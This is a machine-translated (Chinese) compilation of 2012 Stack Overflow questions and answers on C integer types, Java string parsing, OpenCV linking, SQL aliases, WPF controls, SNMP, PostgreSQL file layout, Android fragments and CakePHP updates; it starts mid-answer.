> 时间：2012-12-04T16:06:19.490

*   对于各种类型的大小，请检查[C 标准](http://www.open-std.org/JTC1/SC22/WG14/www/standards)，`long long`必须用至少 64 位表示。

*   要查看编​​译器对您的代码的真正作用，您可以使用例如`objdump -D`二进制文件（或中间目标文件）。

*   在 32 位拱门上，如果您从转换为 ，您**将**丢失数据。`long long``long`

*   据我了解，编译器可能难以决定使用哪个构造函数（基本上无法决定是否使用`ctor(int)`or `ctor(long int)`）。

**编辑：**

```
#include <stdint.h>
...
uint64_t x = 5;
mpreal myVar(i); 
```

按照`c-tor(uint64_t)`定义的方式工作（或者更好地说可以找到明确的匹配） - 因为在 64 位拱门上`(unsigned) long int`相当于`uint64_t`（对于 glibc，它实际上是这样定义的）。该错误源于编译器在处理重载函数时使用的规则 - 有关更多信息，请参阅[C++11 标准](http://isocpp.org/std/the-standard)/[草案](http://isocpp.org/std/the-standard)。

一般来说，如果您希望您的代码可移植，您应该使用在[`inttypes.h`or`stdint.h`](http://en.wikipedia.org/wiki/Stdint.h#stdint.h)中定义的类型- 这是 C99 - 即`uintXX_t`和`intXX_t`. 这些类型保证提供准确的宽度，有关更多信息，请参阅上面的 wiki 链接。*

# java - For循环不增加计数器

> ID：13703847
> 
> 赞同：0
> 
> 时间：2012-12-04T13:17:01.923
> 
> 标签：java

```
static void nodes(String node) {
  int node_location;
  int i;
  int update_i=1;
  node_location=((node.indexOf("(("))-2);
  ArrayList<String> node_array = new ArrayList<String>();

  for( i=1;i<node_location;i++) {
    if(node.charAt(i)!=',') {
      if(node.charAt(i+1)==',' || node.charAt(i+1)==')')
        node_array.add(Character.toString(node.charAt(i)));
      else {
        for(int a=i+2;a<=node.indexOf("),");a++) {
          update_i++;
          if(node.charAt(a)==',') {
            node_array.add(node.substring(i, a));
            break;
          }
        }
        i=update_i;
      }
    }
  }
} 
```

此方法应该采用格式为的字符串`(1,2,3,4,5)`并将数字（作为字符串）存储在数组列表中。问题是`(1,2,333,4,5)`，例如，当我的 if 语句应该转到 else 并检查数字在到达逗号之前有多少位时。然后我把它的子字符串存储到我的数组列表中。问题是，由于某种原因，当我们到达 else 语句时，我的位置没有更新（我们必须增加比 for 循环的更多，因为数字不止一个位置。但是当我运行它时，我的程序打印出以下内容：

> 1
> 2
> 333
> 333
> 33
> 3
> 4
> 5

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T13:21:37.827

不幸的是，很难理解您的代码和您的问题 - 但这看起来很相关：

```
for(int a=i+2;a<=node.indexOf("),");a++) 
```

鉴于您的原始字符串根本不包含`"),"`，`indexOf`将返回-1，并且您永远不会进入循环体。因此`update_i`永远不会增加，您将设置`i`回`1`.

我强烈建议你完全重写你的代码——目前它看起来太复杂了。您不能拆分`,`然后从每个字符串中删除任何非数字字符吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:24:40.533

由于您的问题已经被“skeeted”，我只有以下评论：

我认为在这个例子中你使用正则表达式要好得多。这是拆分示例字符串的代码：

```
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public static void main(String[] args) {
        String str = "(3,4,555,6,4)";

        Pattern pattern = Pattern.compile("\\d+");
        Matcher matcher = pattern.matcher(str);

        while (matcher.find()) {
            System.out.println("found: " + matcher.group());
        }
    }
} 
```

输出：

> 找到：3
> 找到：4
> 找到：555
> 找到：6
> 找到：4

**解释：（** `\d`在`\\d`Java 中转义 '\'）是数字的简写字符类。意思是“`+`上一个词一次或多次”。是贪心的`+`，所以它需要尽可能多的数字到一个匹配中。其余代码只是用于正则表达式匹配的 Java 语法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-04T13:19:37.400

我认为问题之一是您只`update_i`在顶部初始化，而不是每次进入`else`分支时都这样做。

PS为什么所有的复杂性而不仅仅是：

```
String[] tok = node.split(","); 
```

先去掉括号？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:22:06.717

对于我的理解以及您想要如何做，您的代码中有一些错误。

从未正确初始化的变量开始，`node_location`您提供的代码确保甚至没有输入第一个循环。

您的第一个循环从 1 开始，而 String 的索引基于 0，这意味着您没有检查`node`. 该循环也会在`i`到达时结束`node_location`，但是，如果您想要括号中的所有数字`node`，它应该在到达结束时停止。所以`node_location`应该用 in 的索引来`)`初始化`node`。这是假设您只有 1 个右括号。

在您的第二个循环之前，您应该使用 i 初始化 update_1 ，否则您将在循环之后使用 1 + 在您的 else 中完成的循环数更新 i。

你的第二个循环也不正确。你想要做的是 lopp，直到你达到昏迷或右括号。正如 Jon Skeet 指出的那样，您为预期的 String 编写循环的方式将返回 -1 并且不会进入循环。

你应该有同样的条件来检查你是否像以前一样完成了你的多字符编号`if (node.charAt(i + 1) == ',' || node.charAt(i + 1) == ')') {`。您将需要一个变量（String 或 StringBuilder）来收集构成您的数字的所有字符，这样您就可以将它们添加到`node_array`. 如果 if 不匹配，该循环也应该在到达时结束`node_location`。

正如许多人提到的，有更好、更简单的解决方案可以满足您的需求，但我在这里提供的内容是改进您自己的代码的良好开端。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:22:17.103

我认为你应该使用类的`split`方法，`String`因为它会容易得多：

```
static void nodes(String node)
{

   ArrayList<String> node_array = new ArrayList<String>();
   String allValues[] = node.split(",");
   for(String value : allValues){
      node_array.add(value);
   }
} 
```

# c++ - 检查库并在opencv中编译

> ID：13703853
> 
> 赞同：1
> 
> 时间：2012-12-04T13:17:48.540
> 
> 标签：c++, opencv

我输入了这个命令来检查opencv中安装了哪些库，

```
pkg-config --libs opencv 
```

我得到以下输出：

```
/usr/local/lib/libopencv_calib3d.so
/usr/local/lib/libopencv_contrib.s
/usr/local/lib/libopencv_feature2d.so
/usr/local/lib/libopencv_flann.so
/usr/local/lib/libopencv_gpu.so
/usr/local/lib/libopencv_highgui.so
/usr/local/lib/libopencv_imgproc.so
/usr/local/lib/libopencv_legacy.so
/usr/local/lib/libopencv_ml.so
/usr/local/lib/libopencv_nonfree.so
/usr/local/lib/libopencv_objdetect.so
/usr/local/lib/libopencv_photo.so
/usr/local/lib/libopencv_stitching.so
/usr/local/lib/libopencv_ts.so
/usr/local/lib/libopencv_video.so
/usr/local/lib/libopencv_videostab.so 
```

为了编译从文件中读取视频的文件，我应该给出什么适当的命令？

我已经尝试使用`g++ -I/usr/include/opencv -lxcore -lhighgui -lm nameoffile.cpp` 但我不断收到错误，`/usr/lib/ld cannot find -lxcore etc...`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:23:03.717

你可以尝试使用`pkg-config --cflags --libs libname` 然后你可以写这样的东西

```
g++ -I/usr/include/opencv -lxcore -lhighgui -lm nameoffile.cpp `pkg-config --cflags --libs opencv` 
```

这样您就可以包含要链接的库的路径

# sql - SQL 语句 t1、t2 等

> ID：13703860
> 
> 赞同：6
> 
> 时间：2012-12-04T13:18:12.073
> 
> 标签：sql, database, command, statements

我对 SQL 很陌生，我只是想弄清楚当你使用 t1、t2 或 t3 等时它意味着什么……我无法理解它，只想了解它。我试过在谷歌上找遍，但我什么也没找到……你能帮忙吗？

谢谢 MW

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-04T13:20:12.553

t1/t2/t3 是“临时”表的常见表别名（例如，由多个表组成的子查询并且别名不好）....如果有帮助的话，称它为有点懒惰:)

`SELECT * FROM MyTable t1`意味着*从现在开始，我将调用 MyTable t1。* 另一种写法是：`SELECT t1.* FROM MyTable t1`或者如果你没有使用别名，`SELECT MyTable.* FROM MyTable`

# c# - 不直接从 UserControl 派生的 WPF UserControl

> ID：13703861
> 
> 赞同：2
> 
> 时间：2012-12-04T13:18:12.517
> 
> 标签：c#, wpf, user-controls

我想创建几个`UserControl`具有一些通用功能的 WPF 类。出于这个原因，我想从一个新的基类派生这些类，而该基类又派生自`UserControl`.

我的问题是我的 C# 类已定义`partial`，并且自动生成的其他部分`derives`来自我的新基类，`UserControl`而*不是*来自我的新基类。我可以让 Visual Studio 从我的基类而不是派生部分类`UserControl`吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-04T13:24:38.067

当然 - 创建一个类作为用户控件的基本调用：

```
public class BaseUserControl : UserControl
{
    //TODO: Add your common functionality
} 
```

接下来，创建一个用户控件，并更改根声明以引用您的基类：

```
<controls:BaseUserControl x:Class="WpfApplication2.UserControl1"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             xmlns:controls="clr-namespace:WpfApplication2"
             mc:Ignorable="d" 
             d:DesignHeight="300" d:DesignWidth="300">
    <Grid>

    </Grid>
</controls:BaseUserControl> 
```

并更改部分类以匹配：

```
public partial class UserControl1 : BaseUserControl
{
    public UserControl1()
    {
        InitializeComponent();
    }
} 
```

# stl - 如何在已排序的数组中插入元素以使数组保持排序状态？

> ID：13703862
> 
> 赞同：1
> 
> 时间：2012-12-04T13:18:14.290
> 
> 标签：stl, heap, insertion, stdset

在 c++中，`std::set`按排序顺序存储元素可以在 O(log n) 时间内插入元素。但是我知道的所有方法都需要线性时间：

在数组末尾插入元素并将其与前一个元素交换，直到前一个元素小于它 - 需要线性时间。

在数组上使用二进制搜索并找到要插入元素的位置：需要 O(log n) 时间，但在最坏的情况下将元素插入给定位置需要 O(n) 时间。

如果我们将排序后的数组用作堆，我们可以在 O(log n) 时间内插入一个元素，但即使在此之后数组仍然是堆，也不能保证它仍然是排序的。

我需要一种在 O(log n) 时间内将元素插入排序数组的方法，我知道这是可能的，因为`std::set`可以做到，但我不知道怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:21:50.393

解决方案是使用不同的数据结构。`std::set`例如已经使用[red-black-tree](http://en.wikipedia.org/wiki/Red%E2%80%93black_tree)实现。

一般来说，你不能用普通数组来做到这一点。

# case - 比较两个表并输出到新列

> ID：13703864
> 
> 赞同：1
> 
> 时间：2012-12-04T13:18:18.767
> 
> 标签：case

这只是返回 Y 或 N 而不是直接比较数据

tblViewLearners（这个 intID = intLearnerID 在另一个表中）

```
IntID   -   FirstName    -  Surname   -  Course    - Dob    - address     - nationality
701271      Julie           Barnett      Physics     NULL       NULL          NULL
345239      Rachel          Smith        Physics     NULL       NULL          NULL
240259      David           Feffer       Maths       NULL       NULL          NULL 
```

tblAWARDSLearner（基本上，如果学习者进入此表，并且具有“DISTINCTION”）

```
 intID   -  intLearnerID    -  dateawarded
 2402       701271             21/04/1992
 1032       345239             01/01/2010 
```

我的目标

```
IntID   -   FirstName    -  Surname   -  Course     - DISTINCTION Awarded
701271      Julie           Barnett      Physics          Yes
345239      Rachel          Smith        Physics          Yes
240259      David           Feffer       Maths            No 
```

编码

```
SELECT Y.intID
FROM
(
SELECT    A.* ,   
CASE 
        WHEN B.intLearnerID IS NULL THEN 'N' 
        ELSE 'Y' 
END 'DISTINCTION Awarded' x
FROM 
    tblviewlearners A
    LEFT JOIN tblAWARDSLearner B
    ON A.intID = B.intLearnerID

)AS Y; 
```

我也将它与另一张桌子连接起来，但一旦上面的工作正常，就会越过那座桥，值得注意的是，上面的表格已经被进一步声明，所以当我加入时，我不需要将它包含在 FROM 和只是更直接地比较表列（我认为这是正确的）。但是我想先让上述工作。

# ubuntu - 无法在 Ubuntu 中使用 snmp 查询从 MIB-II 的接口组获取数据

> ID：13703866
> 
> 赞同：0
> 
> 时间：2012-12-04T13:18:30.487
> 
> 标签：ubuntu, interface, virtualbox, snmp

两台运行 Ubuntu 的机器。一个在另一个内部的 Virtualbox 上运行。

**在 VM 中**使用以下命令（获取接口数）：

```
snmpget -v 2c -c public localhost 1.3.6.1.2.1.2.1.0 
```

我得到以下结果：

```
iso.3.6.1.2.1.2.1.0 = INTEGER: 2 
```

但是，如果我**在主机中**执行此操作（查询虚拟机）：

```
snmpget -v 2c -c public 10.1.14 1.3.6.1.2.1.2.1.0 
```

我得到：

```
iso.3.6.1.2.1.2.1.0 = No Such Object available on this agent at this OID 
```

我可以对系统组的对象进行 SNMP 查询，但不能对接口组的对象进行 SNMP 查询。

机器运行 Ubuntu 12.10，VM 运行 Ubuntu 12.04。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-08T05:48:27.817

可能是因为/etc/cups/snmp.conf的问题，不同的Linux有snmp.conf的问题，更多新的Linux，可能你会有更多的问题，你可以复制这个

```
 com2sec notConfigUser  127.0.0.1       public
    group   notConfigGroup v1           notConfigUser
    group   notConfigGroup v2c           notConfigUser
    view    systemview    included   .1.3.6.1.2.1.1
    view    systemview    included   .1.3.6.1.2.1.25.1.1
    access  notConfigGroup ""      any       noauth    exact  all none none
    view all    included  .1                               80 
```

到你的 /etc/cups/snmp.conf ，我之前有这个问题，并通过这种方式解决了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-08T07:07:15.123

要获取 snmp 接口 oid 值，请在 /etc/snmp/snmpd.conf 中添加以下内容

查看系统仅包括 .1.3.6.1.2.1.1

# c# - 程序集引用之间的差异

> ID：13703868
> 
> 赞同：9
> 
> 时间：2012-12-04T13:18:41.783
> 
> 标签：c#, .net, visual-studio-2010, visual-studio-2012

在某些机器上，在 csproj 中添加对程序集的引用后生成了下一个标签。

```
<Reference Include="Microsoft.Expression.Interactions">
  <HintPath>..\Libs.SL\Blend\Microsoft.Expression.Interactions.dll</HintPath>
</Reference> 
```

但在某些机器上生成的参考版本、文化、令牌和处理器架构：

```
 <Reference Include="Microsoft.Expression.Interactions, Version=5.0.5.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
  <SpecificVersion>False</SpecificVersion>
  <HintPath>..\Libs.SL\Blend\Microsoft.Expression.Interactions.dll</HintPath>
</Reference> 
```

为什么是这样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:53:29.580

这些行不能帮助您的应用程序找到正确的引用或创建完全限定的程序集名称，这些行有助于 Visual Studio 找到引用。可能只有当 VS 在识别要加载哪个 dll 时出现问题时，您才会发现这些行。

我知道，这不是您期望的答案:) 但我希望它可以帮助您在正确的方向上进行搜索。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:22:23.390

从 msdn 中提取：

> 处理器体系结构添加到 .NET Framework 2.0 版中的程序集标识，以允许特定于处理器的程序集版本。您可以创建标识仅因处理器体系结构而异的程序集版本，例如 32 位和 64 位处理器特定版本。强名称不需要处理器架构。有关详细信息，请参阅 AssemblyNameProcessorArchitecture。在此示例中，**完全限定名称表示 myTypes 程序集具有带有公钥标记的强名称，具有美国英语的区域性值，并且版本号为 1.0.1234.0。它的处理器架构是“msil”，这意味着它将根据操作系统和处理器实时（JIT）编译成 32 位代码或 64 位代码。**
> 
> **请求程序集中类型的代码必须使用完全限定的程序集名称。这称为完全限定绑定。在 .NET Framework 中引用程序集时，不允许使用仅指定程序集名称的部分绑定。**
> 
> 对构成 .NET Framework 的程序集的所有程序集引用也必须包含程序集的完全限定名称。例如，要引用 1.0 版的 System.Data .NET Framework 程序集，应包括：

在源代码中查看更多信息：

[http://msdn.microsoft.com/en-us/library/k8xx4k69.aspx](http://msdn.microsoft.com/en-us/library/k8xx4k69.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:22:37.343

我不是 100% 确定，但根据 的*通常*行为模型`.NET Assemblies`，在第二种情况下，您会获得所引用程序集的详细描述（完全限定名称），因为机器上有*多个*版本的程序集。

通过这种方式，编译器知道您的项目中*究竟*引用了哪个程序集。

# google-app-engine - 我们如何通过 ID（PrimaryKey）获取子数据对象？

> ID：13703869
> 
> 赞同：1
> 
> 时间：2012-12-04T13:18:41.923
> 
> 标签：google-app-engine, jakarta-ee, datanucleus

我正在尝试通过 App Engine 创建一个简单的待办事项 API 服务。我有`User`具有一组数据对象的`Project`数据对象，而这些`Project`数据对象具有一组`Task`对象。下面的代码应该让您对它们的实现和关系有所了解。

```
@PersistenceCapable(detachable = "true")
public class User implements Serializable {
 @PrimaryKey
 @Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
 private Long id;

 @Persistent(mappedBy = "user")
 private List<Project> projects;
}

@PersistenceCapable(detachable = "true")
public class Project implements Serializable {
 @PrimaryKey
 @Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
 private Key id;

 @Persistent
 private User user;

 @Persistent(mappedBy = "project")
 private List<Task> tasks;
}

@PersistenceCapable(detachable = "true")
public class Task implements Serializable {
 @PrimaryKey
 @Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
 private Key id;

 @Persistent
 private Project project;
} 
```

我对用户数据对象所做的事情如下（`EntityManager`定义如 App Engine 帮助页面上所示）：

```
EntityManager em = EMFService.get().createEntityManager();
try {
 User dev = em.find(User.class, id);
 em.remove(dev);
} finally {
 em.close();
} 
```

我想要做的是通过它们的 id/Key 获取`Project`和`Task`数据对象，这是一些长的数字，对应于数据对象，而不是与其父对象的键组合，也指对象。由于这些对象是其他对象的子对象，我无法弄清楚如何通过它们的 id 值来获取它们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T17:32:43.293

GAE 不支持：

> 拥有多对多关系。

和

> “加入”查询。在对父种类执行查询时，您不能在过滤器中使用子实体的字段。请注意，您可以使用键直接在查询中测试父级的关系字段。

所以我建议你改变你的对象模型，直接在项目列表的用户对象中使用长ID，在任务列表和用户的项目对象中使用长ID

或者我建议直接使用数据存储 api，因为这样你就知道你的数据是如何存储的，你如何获取它，并且： **你将为 GAE 设计你的数据**。并使用数据存储 api，您可以使用[祖先路径](https://developers.google.com/appengine/docs/java/datastore/entities#Ancestor_Paths)

# iphone - 如何将 NSMutableArray 中的最后三个数据复制到另一个 NSMutableArray？

> ID：13703879
> 
> 赞同：1
> 
> 时间：2012-12-04T13:19:15.497
> 
> 标签：iphone, objective-c, cocoa, ios4

在 NSMutableArray 我有这样的数据，

```
 MutableArray1:(
           "22.298166 , 73.165809",
           "22.300598 , 73.167183",
           "22.298101 , 73.166188",
           "22.298128 , 73.166194"
           "22.298130 , 73.166194"
          ) 
```

我想将 MutableArray1 中的最后三条数据复制到 MutableArray2 中。

请建议我该怎么做？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-04T13:23:03.923

你可以这样使用[`subarrayWithRange:`](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSArray_Class/NSArray.html#//apple_ref/occ/instm/NSArray/subarrayWithRange%3a)：`NSArray`

```
NSRange range = NSMakeRange([mutableArray1 count] - 3, 3);
NSMutableArray *mutableArray2 = [NSMutableArray arrayWithArray:
                                  [mutableArray1 subarrayWithRange:range]]; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-04T13:23:26.743

它非常简单

应用while循环

```
int i=1;
while (i<4 && i < [array1 count])
{
    [array2 addObject:[array1 objectAtIndex:([array1 count]-i)]];
    i++;
} 
```

希望对你有帮助

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-04T13:26:00.747

此代码将帮助您

```
NSMutableArray * array = [[NSMutableArray alloc]initWithObjects:@"1",@"2",@"3",@"4",@"5",@"6",@"7",@"8", nil];

    NSMutableArray * otherArray = [[NSMutableArray alloc]init];
    for (int i= array.count-3; i<array.count; i++) {
        [otherArray addObject:[array objectAtIndex:i]];
    }
    NSLog(@"%@",otherArray); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-04T13:21:56.413

```
for (int i=[array1 count] - 4 ; i<[array1 count] ; i++){
    [array2 addObject:[array1 objectAtIndex:i]];
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:24:15.647

为此，您可以实现自己的自定义代码。

```
if([yourArray count] > 3)
{
  for (int loop = [yourArray count]; loop >= ([yourArray count]-3) ; loop--)
     [secondArray addObject:[yourArray objectAtIndex:loop-1]];
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T13:24:58.583

```
use this
   MutableArray *array = [main_array subarrayWithRange:NSMakeRange(main_array.count-3, main_array.count)]; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-04T13:26:56.437

```
[MutableArray2 addObject:[MutableArray1 objectAtIndex:[MutableArray1 count]-1]] ;
[MutableArray2 addObject:[MutableArray1 objectAtIndex:[MutableArray1 count]-2]] ;
[MutableArray2 addObject:[MutableArray1 objectAtIndex:[MutableArray1 count]-3]] ; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-04T13:29:26.653

```
 if([yourArray1 count] > 3){

        for (int i=[yourArray1 count] - 4 ; i<[yourArray1 count] ; i++){
          [yourArray2 addObject:[yourArray1 objectAtIndex:i]];
        }
    }
    else{
        for (int i= 0 ; i<[yourArray1 count] ; i++){
          [yourArray2 addObject:[yourArray1 objectAtIndex:i]];
        }
    } 
```

# java - 在 FragmentTransaction 中使用 add().addToBackStack()、add().detach() 和 replace().addToBackStack() 有什么区别？

> ID：13703881
> 
> 赞同：11
> 
> 时间：2012-12-04T13:19:18.457
> 
> 标签：java, android, android-fragments, fragmenttransaction

在 Android[文档](http://developer.android.com/reference/android/app/FragmentTransaction.html)的 FragmentTransaction 项中，描述了该方法与对当前视图中添加的所有 Fragment`replace()`调用该方法`remove()`然后调用该方法相同`add()`。在这种情况下，为了恢复之前的片段，我们可以使用`addBackToStack()`，这意味着事务状态仍然由片段管理器管理，并且在我们弹出堆栈时将反转其操作。

另一方面，当我们使用 实现事务时`add()`，除了使用 之外`add().addBackToStack()`，我们还可以使用使用`detach()`方法和恢复片段`attach()`，它们的行为与`addBackToStack()`.

那么这些场景在幕后有什么区别呢？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-21T12:53:42.443

我研究得更多，更明显的是，Fragment 的生命周期`detach()`和两者之间的区别。当我们在后`addToBackStack ()`栈中添加 Fragment 时，依次调用 methods`onPause()`和. 在这种状态下，片段清理与其视图关联的资源并“停留”在那里等待再次调用。从后栈返回布局被称为仅用于片段绘制其用户界面的方法。实际上，片段并没有被破坏。`onStop()``onDestroyView()``onCreateView()`

另一方面，当我们使用`detach()`删除或替换片段时，依次调用所有首先引用的相同方法 ( `onPause()`, `onStop()`, `onDestroyView()`) 添加这两个方法：`onDestroy()`, 对片段的状态进行最终清理 , 将片段`onDetach()`分离为不再与其活动相关联。

基本上，在幕后，它们没有相同的行为：使用`addToBackStack()`片段保持实例化`detach()`，而不是。

# postgresql - postgres db 文件 - 哪个文件代表特定的表/索引？

> ID：13703886
> 
> 赞同：13
> 
> 时间：2012-12-04T13:19:36.673
> 
> 标签：postgresql

当我`sql-8.2/base/`检查我的表占用了多少空间时，有很多由数字命名的文件。如何找到存储我的特定表和该表索引的特定文件？

例如，我按日期排序文件（最新的在前），但在那个特定时期有几个：

```
-rw-------  1 postgres sql  1.0G Dec  4 13:41 15426233
-rw-------  1 postgres sql  149M Dec  4 13:41 15426233.4
-rw-------  1 postgres sql  1.0G Dec  4 13:41 15426233.3
drwx------  3 postgres sql   75K Dec  4 13:40 .
-rw-------  1 postgres sql  1.0G Dec  4 13:34 15426233.2
-rw-------  1 postgres sql  1.0G Dec  4 13:28 15426233.1
-rw-------  1 postgres sql  3.6M Dec  4 11:23 1249
-rw-------  1 postgres sql  584K Dec  4 11:23 2659
-rw-------  1 postgres sql  672K Dec  4 11:23 2663
-rw-------  1 postgres sql  136K Dec  4 11:23 2662
-rw-------  1 postgres sql  848K Dec  4 11:23 2608
-rw-------  1 postgres sql  2.6M Dec  4 11:23 2658
-rw-------  1 postgres sql  600K Dec  4 11:23 2674
-rw-------  1 postgres sql   56K Dec  4 11:23 2679
-rw-------  1 postgres sql  632K Dec  4 11:23 2673
-rw-------  1 postgres sql   72K Dec  4 11:23 2678
-rw-------  1 postgres sql  1.8M Dec  4 11:22 2619
-rw-------  1 postgres sql  112K Dec  4 11:21 2696
-rw-------  1 postgres sql 1007M Dec  4 11:21 15426228.5
-rw-------  1 postgres sql  1.0G Dec  4 11:19 15426228.4
-rw-------  1 postgres sql  1.0G Dec  4 11:19 15426228.3
-rw-------  1 postgres sql  1.0G Dec  4 11:18 15426228.2
-rw-------  1 postgres sql  1.0G Dec  4 11:17 15426228.1
-rw-------  1 postgres sql  1.0G Dec  4 11:16 15426228 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-12-04T13:28:51.457

每个目录代表一个数据库（通过 创建`create database`）。该数字是数据库的oid。要查看 oid 及其名称，请运行以下语句：

```
select oid, datname
from pg_database; 
```

在每个目录中，每个文件对应一个条目，`pg_class`其中 oid 与目录中文件的编号匹配：

您可以通过运行以下语句查看 oid 及其相关关系：

```
select cl.relfilenode, nsp.nspname as schema_name, cl.relname, cl.relkind
from pg_class cl
  join pg_namespace nsp on cl.relnamespace = nsp.oid; 
```

您可能还想查看手册

*   [确定磁盘使用情况](http://www.postgresql.org/docs/current/static/disk-usage.html)
*   [数据库文件布局](http://www.postgresql.org/docs/current/static/storage-file-layout.html)
*   [系统目录](http://www.postgresql.org/docs/current/static/catalogs.html)

顺便说一句：如果你真的还在运行 8.2，你应该尽快升级。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-04T13:27:00.873

```
select pg_relation_filepath('OID or name of a table, index, sequence, or toast table'); 
```

例如：

```
select pg_relation_filepath('flush_history');
Returns base/83780/153211 which you will find in your data directory. 
```

[http://www.postgresql.org/docs/current/static/functions-admin.html](http://www.postgresql.org/docs/current/static/functions-admin.html)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-04T13:28:21.933

要检查表占用了多少空间：

```
SELECT pg_size_pretty(pg_total_relation_size('table_name_here')) 
```

它将为您提供带有索引和“toast”表的表的大小。详情[在这里](http://www.postgresql.org/docs/current/static/functions-admin.html)。

# python - 如何在 Python 或 PyQt4 中捕获系统注销/关闭/锁定事件

> ID：13703887
> 
> 赞同：1
> 
> 时间：2012-12-04T13:19:40.863
> 
> 标签：python, pyqt4

我在 .NET 中有一个应用程序，现在我正在使用 Python 和 PyQt 对其进行重新编码。在我的应用程序中，我需要知道系统事件（锁定、注销、重启和关机）。我可以使用下面的代码段从 .NET Frame work 3.5 管理它

```
AddHandler SystemEvents.SessionEnding, AddressOf ClosingApplication
AddHandler SystemEvents.SessionSwitch, AddressOf SessionSwitchEvent 
```

根据系统，我需要做一些事情来更新我的数据库。

任何人都可以帮助我lz...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:51:42.890

您将需要使用[pywin32 库](http://sourceforge.net/projects/pywin32/)。它是 win32api 的包装类。然后，您可以使用[SetConsoleCtrlHandler](http://docs.activestate.com/activepython/2.7/pywin32/win32api__SetConsoleCtrlHandler_meth.html)来捕获信号。

要干净地捕获信号，您需要生成一个控制台窗口。为了使您的应用程序运行干净，您可以在隐藏状态下运行控制台窗口。有关如何生成控制台窗口的更多信息，请参阅：[Python - Windows 关闭事件](https://stackoverflow.com/questions/1411186/python-windows-shutdown-events)

# ruby-on-rails-3 - 在以下（简单）情况下如何使用 collection_select？

> ID：13703894
> 
> 赞同：0
> 
> 时间：2012-12-04T13:20:00.870
> 
> 标签：ruby-on-rails-3

我有这两个模型：

```
class Person < ActiveRecord::Base
  attr_accessible :contact, :name

  validates :name, :presence => true

  has_many :books

end

class Register < ActiveRecord::Base
  attr_accessible :checkin, :checkout, :notes, :person, :book

end 
```

在 registers/_form.html.erb 我想使用 f.collection_select 我可以从列表中选择一个人的名字。Register 模型的目的是记录结帐的历史。

这是我第一次尝试使用 collection_select，我无法用我在 stackoverflow 和 google 上阅读的示例来解决这个问题。也许我没有模型中需要的所有东西？

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:34:59.280

您的模型中存在与关联相关的错误。正确的关联应该是：

```
class Person < ActiveRecord::Base
   has_many :registers, :inverse_of => :person
end

class Register < ActiveRecord::Base
   belongs_to :person, :inverse_of => :registers
end 
```

然后在你的`registers/_form.html.erb`你必须有如下的东西：

```
<%= form_for :register do |f| %>
   <% # ... input elements for the rest of the Register model %>

   <%= f.collection_select :person_id, Person.all, :id, :name %>

   <% # ... input elements for the rest of the Register model %>

   <%= f.submit %>
<% end %> 
```

# php - CakePHP 将 `id` = '1' 放在 WHERE 子句中

> ID：13703895
> 
> 赞同：3
> 
> 时间：2012-12-04T13:20:02.110
> 
> 标签：php, mysql, cakephp

我正在尝试使用以下命令更新一行，但 CakePHP 总是`'1'`在`WHERE`子句中放一个。

```
# the PHP command
$this->Administrator->id = $id; # id = 6, it wasn't changed
$this->Administrator->save($this->request->data);

-- simplified version of the generated SQL
UPDATE `someTable`  SET `someField` = 'value', `id` = '6' WHERE `id` = '1' 
```

有趣的`id`是，在更新部分生成的 SQL 中是正确的，但在`WHERE`子句中不正确，是的，`id`列是表中的主键。我正在使用 CakePHP 的最新版本。

我做错了什么？`id`in`WHERE`子句怎么可能`6`？

**编辑：**它使用 Bake 生成的代码产生相同的结果。也许模型或数据库有问题？

**编辑 2：**我正在记录所有查询，在尝试更新之前，CakePHP 执行了一些操作`SELECT count(*)`，它使用`WHERE id = 6`.

**编辑 3：**插入、删除和读取工作正常。

* * *

## 最后更新：问题解决

我不确定发生了什么，但我认为我解决了问题。

首先，更新不是使用 Bake 生成的代码的工作事件。

其次，只有Administrators的更新不起作用，其他的都可以。

第三，我认为问题来自表中的一列，`administrators`它也被称为`administrators`，它是一个`TINYINT(1)`. 我将列名更改为`administrators_area`，也更改了一些代码，一切正常。

